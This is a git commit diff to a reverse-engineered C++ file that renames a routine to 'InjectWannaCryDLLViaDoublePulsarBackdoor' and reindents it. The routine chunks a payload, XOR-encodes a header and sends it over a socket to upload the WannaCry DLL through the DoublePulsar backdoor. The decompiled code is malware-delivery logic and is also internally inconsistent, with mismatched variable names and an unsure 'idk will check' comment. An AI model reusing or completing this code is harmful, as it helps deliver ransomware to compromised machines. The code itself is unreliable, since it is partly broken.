8b7b8a8cedb18be176fa114f14e79e5decc84acd
bhassani <bhassani@users.noreply.github.com>
2021-02-05 16:51:07 -0600

    Update DoublePulsar_Wannacry_Reverse.cpp

--- DoublePulsar Upload DLL/DoublePulsar_Wannacry_Reverse.cpp
+++ DoublePulsar Upload DLL/DoublePulsar_Wannacry_Reverse.cpp
@@ -35,47 +35,50 @@ int v12;
 int v13;
 int v22 = 0;
 int i;
-int send_payload() {
+int offset;
 
-if ( TotalSizeOfPayload / 4096 > 0 )
-    {
-      for ( i = 0; ; offset = i )
-      {
-        *(_QWORD *)&signature = TotalSizeOfPayload;
-	*(_QWORD *)&signature[4] = 4096;
-        *(_DWORD *)&signature[8] = offset;
-        encodePacket(xorkey, signature, 12);
-        v29 = *(_QWORD *)v16;
-        v30 = *(_DWORD *)&v16[8];
-        qmemcpy(&v31, (char *)hMem + offset, 4096);
-        if ( send(socket, &buf, 4178, 0) == -1 )
-		break;
-	if ( buf[34] != 82 )
-          break;
-	v13 = __OFSUB__(v22 + 1, iterations);
-        v12 = v22++ + 1 - iterations < 0;
-        i += 4096;
-        if ( !(v12 ^ v13) )
-          break;
-      }
-   }
+int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
+{
+	if ( TotalSizeOfPayload / 4096 > 0 )
+	    {
+	      for ( i = 0; ; offset = i )
+	      {
+		*(_QWORD *)&signature = TotalSizeOfPayload;
+		*(_QWORD *)&signature[4] = 4096;
+		*(_DWORD *)&signature[8] = offset;
+		encodePacket(xorkey, signature, 12);
+		v29 = *(_QWORD *)v16;
+		v30 = *(_DWORD *)&v16[8];
+		qmemcpy(&v31, (char *)hMem + offset, 4096);
+		if ( send(socket, &buf, 4178, 0) == -1 )
+			break;
+		if ( buf[34] != 82 )
+		  break;
+		v13 = __OFSUB__(v22 + 1, iterations);
+		v12 = v22++ + 1 - iterations < 0;
+		i += 4096;
+		if ( !(v12 ^ v13) )
+		  break;
+	      }
+	   }
 
-if ( remainder > 0 )
-    {
-      ImportantValue = htons(remainder + 78);
-      v28 = remainder + 13;
-      last_offset = iterations << 12;
-      v26 = remainder;
-      v27 = remainder;
-      *(_QWORD *)signature = TotalSizeOfPayload;
-      *(_QWORD *)signature[4] = remainder;
-      *(_DWORD *)&signature[8] = last_offset; //offset increase ???  idk will check
-      encodePacket(xorKey, signature, 12);
-      v30 = *(_DWORD *)&signature[8];
-      v29 = *(_QWORD *)signature;
-      qmemcpy(&v31, (char *)hMem + last_offset, remainder);
-      if ( send(s, &buf, remainder + 82, 0) != -1 )
-        recv(s, &recvbuff, 4096, 0);
-    }
-    GlobalFree(hMem);
+	if ( remainder > 0 )
+	    {
+	      ImportantValue = htons(remainder + 78);
+	      v28 = remainder + 13;
+	      last_offset = iterations << 12;
+	      v26 = remainder;
+	      v27 = remainder;
+	      *(_QWORD *)signature = TotalSizeOfPayload;
+	      *(_QWORD *)signature[4] = remainder;
+	      *(_DWORD *)&signature[8] = last_offset; //offset increase ???  idk will check
+	      encodePacket(xorKey, signature, 12);
+	      v30 = *(_DWORD *)&signature[8];
+	      v29 = *(_QWORD *)signature;
+	      qmemcpy(&v31, (char *)hMem + last_offset, remainder);
+	      if ( send(s, &buf, remainder + 82, 0) != -1 )
+		recv(s, &recvbuff, 4096, 0);
+	    }
+	
+	GlobalFree(hMem);
 }
